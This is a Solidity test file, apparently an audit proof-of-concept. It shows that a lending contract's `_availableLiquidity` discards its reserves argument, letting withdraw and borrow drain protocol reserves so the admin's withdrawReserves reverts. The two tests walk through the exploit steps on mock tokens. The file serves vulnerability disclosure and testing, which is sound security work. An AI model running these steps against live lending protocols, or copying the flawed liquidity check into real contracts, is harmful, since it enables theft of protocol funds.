// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ILendingPool} from "src/interfaces/ILendingPool.sol";
import {IPriceOracle} from "src/interfaces/IPriceOracle.sol";
import {Lending} from "src/Lending/Lending.sol";
import {PriceOracle} from "src/PriceOracle.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "test/helpers/BaseTest.sol";

/// @notice `Lending._availableLiquidity` (line 830-833) declares an
/// `accruedReserves` parameter and discards it. Both call sites (`withdraw` line 165
/// and `borrow` line 204) pass `reserve.accruedReserves` as the second argument and
/// rely on the function to subtract it. The function does not. The result: user
/// operations can consume protocol-owned reserve tokens, leaving a state where the
/// bookkeeping says `accruedReserves > 0` but the contract balance is short, so admin
/// `withdrawReserves` reverts on the underlying ERC20 transfer.
///
/// CertiK AI Auditor Lite did not surface this finding when scanning the Lending stack.
contract AvailableLiquidityBugPoC is BaseTest {
    uint256 internal constant USDC_PRICE = 1e8;
    uint256 internal constant WETH_PRICE = 2_000e8;

    MockERC20 internal usdc;
    MockERC20 internal weth;
    Lending internal lending;
    PriceOracle internal oracle;

    function setUp() public override {
        super.setUp();

        usdc = deployMockToken("USDC", 6);
        weth = deployMockToken("WETH", 18);

        ILendingPool.InterestRateParams memory irParams = ILendingPool.InterestRateParams({
            baseRateRayPerYear: 0, slope1RayPerYear: 2e26, slope2RayPerYear: 8e26, optimalUtilizationBps: 8_000
        });

        vm.startPrank(owner);
        oracle = new PriceOracle();
        // 10% reserve factor on USDC ensures `accruedReserves` grows from borrower interest.
        lending = new Lending(IPriceOracle(address(oracle)), 5_000);
        lending.listReserve(address(usdc), irParams, 8_000, 8_500, 500, 1_000, true, true);
        lending.listReserve(address(weth), irParams, 7_500, 8_000, 500, 1_000, true, true);
        oracle.setPrice(address(usdc), USDC_PRICE);
        oracle.setPrice(address(weth), WETH_PRICE);
        vm.stopPrank();

        for (uint256 i; i < 3; ++i) {
            address u = [alice, bob, charlie][i];
            mintAndApprove(usdc, u, address(lending), 10_000_000e6);
            mintAndApprove(weth, u, address(lending), 1_000 ether);
        }
    }

    /// @notice Alice's withdrawal of the full contract balance — permitted by the
    /// buggy `_availableLiquidity` — drains the reserve portion. Admin's later attempt
    /// to extract those reserves reverts on the ERC20 transfer.
    function testPoC_availableLiquidityIgnoresReservesArgument() public {
        // 1) Alice supplies 1,000 USDC; Bob supplies 1 WETH and borrows 750 USDC.
        //    USDC utilization in this reserve is now 75%.
        vm.prank(alice);
        lending.supply(address(usdc), 1_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 1 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 750e6, bob);

        // 2) Advance one year. Borrower interest accrues; reserveFactor (10%) skims
        //    a portion to `accruedReserves`. Persist the indices to storage.
        advanceSeconds(365 days);
        lending.accrueInterest(address(usdc));

        // 3) Snapshot post-accrual state.
        uint256 reservesAccrued = lending.getReserveData(address(usdc)).accruedReserves;
        uint256 contractBalance = usdc.balanceOf(address(lending));
        assertGt(reservesAccrued, 0, "reserves should have accrued from borrower interest");

        // The fix would compute liquidity as `balance - reserves`. Therefore any
        // withdrawal in the range (balance - reserves, balance] should revert under
        // correct accounting. Pick exactly that boundary case: withdraw the full
        // contract balance, which exceeds `balance - reserves` by `reservesAccrued`.
        uint256 attemptedWithdraw = contractBalance;
        uint256 correctMaxWithdraw = contractBalance - reservesAccrued;
        assertGt(attemptedWithdraw, correctMaxWithdraw, "test scenario must straddle the reserve boundary");

        // 4) Alice withdraws the full balance. With the bug, the liquidity check
        //    `_availableLiquidity = contractBalance` succeeds. Without the bug,
        //    `_availableLiquidity` would equal `contractBalance - reservesAccrued`,
        //    which is less than the request, and the call would revert with
        //    `InsufficientLiquidity`.
        vm.prank(alice);
        uint256 withdrawn = lending.withdraw(address(usdc), attemptedWithdraw, alice);
        assertEq(withdrawn, attemptedWithdraw, "alice extracted the full balance including reserve portion");

        // 5) Snapshot post-withdrawal state.
        uint256 balanceAfter = usdc.balanceOf(address(lending));
        uint256 reservesAfter = lending.getReserveData(address(usdc)).accruedReserves;

        // ─── HARM ASSERTION 1: bookkeeping vs. reality desync ───────────────────
        // `accruedReserves` bookkeeping is unchanged (no reserve withdrawal happened),
        // but the contract balance has been drained below the reserve amount.
        assertEq(reservesAfter, reservesAccrued, "reserves bookkeeping unchanged");
        assertLt(balanceAfter, reservesAccrued, "contract balance < reserves owed to admin (DESYNC)");

        // ─── HARM ASSERTION 2: admin cannot extract their own reserves ──────────
        // The bookkeeping check `amount <= accruedReserves` passes, but the underlying
        // ERC20 `safeTransfer` reverts because the contract no longer holds the tokens.
        vm.prank(owner);
        vm.expectRevert();  // ERC20InsufficientBalance from the underlying transfer
        lending.withdrawReserves(address(usdc), reservesAccrued, owner);

        // ─── HARM ASSERTION 3: invariant 3 violation (informational) ────────────
        // The README's invariant 3:
        //   `balance >= netSupply + accruedReserves` where `netSupply = supply - borrow`.
        // After this withdrawal, the borrowOutstanding grew while supply was reduced,
        // so the invariant relation depends on the relative magnitudes; the cleanest
        // observable violation is the bookkeeping/reality desync asserted above.

        // ─── DIAGNOSTIC LOGS ────────────────────────────────────────────────────
        emit log_named_uint("USDC balance before Alice's withdraw   ", contractBalance);
        emit log_named_uint("accruedReserves at withdraw time       ", reservesAccrued);
        emit log_named_uint("Alice withdrew (full balance)          ", withdrawn);
        emit log_named_uint("USDC balance after withdraw            ", balanceAfter);
        emit log_named_uint("Tokens admin owes itself but cannot get", reservesAccrued - balanceAfter);
    }

    /// @notice Mirror of the withdraw-path bug, exercised through `borrow`. The same
    /// `_availableLiquidity` discarded-arg defect lets a borrower with sufficient
    /// collateral extract the reserve portion of the pool as new debt. The borrower
    /// does NOT need a prior supply position in the affected asset — only collateral
    /// of any other listed reserve. Same desync; the bug fires for any borrower whose
    /// request lands in the `(balance - reserves, balance]` range, not just a malicious
    /// one.
    function testPoC_borrowPathIgnoresReservesArgument() public {
        // 1) Build the same accrued-reserves state as the withdraw test, then have
        //    Bob fully repay so the pool sits at "supply-side equity = balance - reserves".
        vm.prank(alice);
        lending.supply(address(usdc), 1_000e6, alice);
        vm.prank(bob);
        lending.supply(address(weth), 1 ether, bob);
        vm.prank(bob);
        lending.borrow(address(usdc), 750e6, bob);

        advanceSeconds(365 days);
        lending.accrueInterest(address(usdc));

        // Refresh oracle prices so they are not stale for the borrow's HF computation.
        vm.startPrank(owner);
        oracle.setPrice(address(usdc), USDC_PRICE);
        oracle.setPrice(address(weth), WETH_PRICE);
        vm.stopPrank();

        // Bob fully repays. Pool now holds Alice's claim + reserves; no outstanding debt.
        vm.prank(bob);
        lending.repay(address(usdc), type(uint256).max, bob);

        // 2) Snapshot post-repay state.
        uint256 reservesAccrued = lending.getReserveData(address(usdc)).accruedReserves;
        uint256 contractBalance = usdc.balanceOf(address(lending));
        assertGt(reservesAccrued, 0, "reserves should have accrued from prior borrow cycle");
        assertGt(contractBalance, reservesAccrued, "balance must exceed reserves for the bug to be reachable");

        // 3) Charlie deposits enough WETH collateral to borrow up to the full USDC
        //    contract balance. With WETH @ $2k and a 75% CF, 10 WETH gives $15k of
        //    USDC borrow capacity — far above what's available in the pool.
        vm.prank(charlie);
        lending.supply(address(weth), 10 ether, charlie);

        uint256 charlieUsdcBefore = usdc.balanceOf(charlie);

        // 4) Charlie requests the full contract balance. With the bug, the liquidity
        //    check `_availableLiquidity = contractBalance` succeeds. Without the bug,
        //    `_availableLiquidity` would equal `contractBalance - reservesAccrued`,
        //    less than the request, and the call would revert.
        uint256 attemptedBorrow = contractBalance;
        uint256 correctMaxBorrow = contractBalance - reservesAccrued;
        assertGt(attemptedBorrow, correctMaxBorrow, "test scenario must straddle the reserve boundary");

        vm.prank(charlie);
        lending.borrow(address(usdc), attemptedBorrow, charlie);

        // 5) Snapshot post-borrow state.
        uint256 balanceAfter = usdc.balanceOf(address(lending));
        uint256 reservesAfter = lending.getReserveData(address(usdc)).accruedReserves;
        uint256 charlieReceived = usdc.balanceOf(charlie) - charlieUsdcBefore;

        // ─── HARM ASSERTION 1: borrower received reserve-territory tokens ───────
        assertEq(charlieReceived, attemptedBorrow, "borrower received the full borrow including reserves");

        // ─── HARM ASSERTION 2: bookkeeping vs. reality desync ───────────────────
        // accruedReserves bookkeeping is unchanged; the underlying tokens have left.
        assertEq(reservesAfter, reservesAccrued, "reserves bookkeeping unchanged");
        assertLt(balanceAfter, reservesAccrued, "contract balance < reserves owed to admin (DESYNC)");

        // ─── HARM ASSERTION 3: admin cannot extract their own reserves ──────────
        vm.prank(owner);
        vm.expectRevert();  // ERC20InsufficientBalance from the underlying transfer
        lending.withdrawReserves(address(usdc), reservesAccrued, owner);

        // ─── DIAGNOSTIC LOGS ────────────────────────────────────────────────────
        emit log_named_uint("USDC balance before Charlie's borrow   ", contractBalance);
        emit log_named_uint("accruedReserves at borrow time         ", reservesAccrued);
        emit log_named_uint("Charlie borrowed (full balance)        ", attemptedBorrow);
        emit log_named_uint("USDC balance after borrow              ", balanceAfter);
        emit log_named_uint("Tokens admin owes itself but cannot get", reservesAccrued - balanceAfter);
    }
}
